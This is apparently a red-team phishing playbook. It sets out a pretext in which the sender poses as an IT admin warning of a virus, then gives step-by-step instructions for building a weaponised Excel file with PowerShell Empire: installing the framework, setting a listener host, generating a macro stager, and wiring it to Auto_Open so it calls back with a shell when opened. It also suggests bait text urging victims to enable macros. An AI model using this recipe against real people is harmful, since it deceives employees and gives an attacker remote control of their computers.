# Malware Infection Email

**Objective:** Shell

## Pretext: 
You are an IT Admin and a new virus has been infecting computers. You are sending out a spreadsheet to users who are affected. You're asking the phished users to view the document to make sure they're not on the list and to come see the admin if you are.


## To Change:
Create your own macros (Empire is easiest) to call back. 

## Creating a malicious Macros via Empire
1. Installing Empire
  1.a. git clone git@github.com:PowerShellEmpire/Empire.git
  1.b. ./setup/install.sh
2. Starting up a listener:
  2.a. set host <listening host:port>
  2.b. set whatever parameters you want on this, just type 'info'
  2.c. 'execute'
3. Generating the Macro
  3.a. usestager macro
  3.b. set listener <listener number>
  3.c. 'execute'
  3.d. copy the output function
4. Inserting the macro
  4.a. Open Excel > New Document > 'alt+F11' will get you to the macros
  4.b. Double-clck on "This Workbook"
  4.c. Paste in the macro function from Empire
  4.d. Change the Sub call to 'Auto_Open()'
  4.e. Add the line 'Dim str As String' to the top of the Debugging function call before the powershell call.
  4.f. Go back to the spreadsheet and add in whatever content you want. I like to add in random strings and at the top say that macros needs enabled to view the content. Helps with the pretext.